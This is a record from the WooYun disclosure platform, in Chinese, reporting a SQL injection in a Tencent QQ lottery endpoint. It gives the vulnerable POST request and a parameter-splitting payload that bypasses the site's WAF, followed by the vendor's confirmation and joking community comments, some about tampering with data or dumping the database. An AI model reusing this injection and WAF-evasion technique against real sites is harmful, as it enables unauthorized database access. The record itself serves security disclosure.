{"id": 1566, "wybug_id": "wooyun-2014-069416", "wybug_title": "腾讯QQ彩票某处SQL注射", "wybug_corp": "腾讯", "wybug_author": "Jannock", "wybug_date": "2014-07-23 15:45", "wybug_open_date": "2014-09-06 15:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向公众公开  简要描述： 腾讯的waf越来越利害了，手中几个注入都成了鸡肋。刚好发现腾讯QQ彩票某处SQL注射，此注入点存在两种方式绕过waf。 详细说明：  注入地址：\nPOST /my/index.php?mod=securityinfo&op=AjaxUpdateTipsSet HTTP/1.1Host: 888.sports.qq.comtyp=kjhm&kjhm_ssq=1&kjhm_dlt=0&kjhm_fc3d=0&kjhm_pl3=0&kjhm_pl5=0&kjhm_qlc=0&kjhm_qxc=0&kjhm_exw=0&kjhm_sfc=0&kjhm_r9=0&kjhm_jq=0&kjhm_bq=0\n除了 typ 参数外，其它参数都存在SQL注入猜是 update 型 注入像 update table set kjhm_ssq=1，kjhm_dlt=0 ...... where uid=xxxxx由于这里太多参数，所以可以结合多参数方式绕过waf拦截方式1：\ntyp=kjhm&kjhm_pl3=0*/select 2)))/*&kjhm_dlt=0*/((1=1),0,/*&kjhm_pl5=0*//*&kjhm_qlc=0*/&kjhm_qxc=0&kjhm_exw=0&kjhm_sfc=0&kjhm_r9=0&kjhm_jq=0&kjhm_bq=0&kjhm_fc3d=0*/(select 1 union/*&kjhm_ssq=1-(if/*typ=kjhm&kjhm_pl3=0*/select 2)))/*&kjhm_dlt=0*/((1=2),0,/*&kjhm_pl5=0*//*&kjhm_qlc=0*/&kjhm_qxc=0&kjhm_exw=0&kjhm_sfc=0&kjhm_r9=0&kjhm_jq=0&kjhm_bq=0&kjhm_fc3d=0*/(select 1 union/*&kjhm_ssq=1-(if/*\n根据参数顺序不同来绕过。有多种组合来实现过滤拦截。由于大部分工具不支持，那么我们来第二种。方式2：参考：  WooYun: 腾讯某分站一个比较有意思的SQL注射漏洞 继续可用。。   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-07-28 09:27 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-23 15:50 |    \t\tAnonymous \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:30        | 园长是大傻逼)\t\t \n  很棒    \n     2014-07-23 15:52 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  这个屌了。。。    \n     2014-07-23 15:52 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  可以中500w吗？    \n     2014-07-23 15:58 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  本来我该中奖了，谁给我改了    \n     2014-07-23 16:02 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  500万 在哪里    \n     2014-07-23 16:06 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  前排卖彩票    \n     2014-07-23 16:38 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力    \n     2014-07-23 17:32 |    \t\t紫衣大侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:21        | 愿结天下有识之士)\t\t \n  为毛这么牛B。。。    \n     2014-07-23 17:34 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n  我买中了的 结果被洞主改了数据  还我 500万。    \n     2014-07-23 17:44 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  我的1000万是不是你改的！！！    \n     2014-07-23 17:56 |    \t\tAerfa21 \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:44        )\t\t \n  洞主，你是怎么绕waf的？    \n     2014-07-23 18:20 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  居然还能挖腾讯sql    \n     2014-07-23 19:32 |    \t\t        Jn·  \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:14        | 本小菜很可爱，如果不服你TM来打我啊--哎呀...)\t\t \n  500万呢    \n     2014-07-23 19:48 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  非常感谢您的报告，该问题其他白帽子已报告过，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理    \n     2014-07-23 22:59 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @1c3z   经常听到...    \n     2014-07-24 12:17 |    \t\tCoffeeSafe \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:37        )\t\t \n  今晚一起买彩票~    \n     2014-07-25 11:33 |    \t\t黑色的屌丝 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        | →_→→_→)\t\t \n  我就想知道。一哥怎么快速定位一个注入点的。    \n     2014-07-28 09:37 |    \t\tC4ndy \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        )\t\t \n  我的彩票绝对是让你改的,    \n     2014-07-28 09:56 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  还我100000万    \n     2014-09-06 17:51 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  快速定位一个注入点的    \n     2014-09-06 18:21 |    \t\tyinian \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:22        | 代 码 审 计 求 交 流)\t\t \n  赶紧脱裤    \n     2014-10-08 17:36 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  这组合看的真头晕    \n     2014-11-05 16:38 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  真的好强大！    \n     2014-12-19 16:22 |    \t\t风之传说 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:28        | 借用朋友的一句话，你的时间在哪里，你的成...)\t\t \n  真特么屌爆了。。代码牛伤不起啊。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}